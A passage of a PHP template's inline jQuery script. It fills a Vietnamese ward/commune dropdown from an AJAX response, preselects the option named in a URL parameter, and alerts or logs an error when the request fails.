                        if(response.success) {
                            // alert(response.data);
                            var data = response.data;
                            var url_string = window.location.href;
                            var url = new URL(url_string);
                            var phuong_xa_mobile = url.searchParams.get("phuong_xa_mobile");
                            var html = "<option value='0'>--Phường/xã--</option>";
                            data.forEach(function (item) {
                             var phuong_xa_mobile_res = item.name;
                             if(phuong_xa_mobile_res == phuong_xa_mobile){
                              var select_re_a = 'selected';}
                              html += "<option "+ select_re_a + " value='" + item.name + "' data_id_huyen ='"+item.term_id+"'>" + item.name + "</option>";
                            });
                            $('#phuong_xa_mobile').html(html);
                          }
                          else {
                            alert('Đã có lỗi xảy ra');
                          }
                        },
                        error: function( jqXHR, textStatus, errorThrown ){
                          console.log( 'The following error occured: ' + textStatus, errorThrown );
                        }
                      });
}
</script>
<?php }?>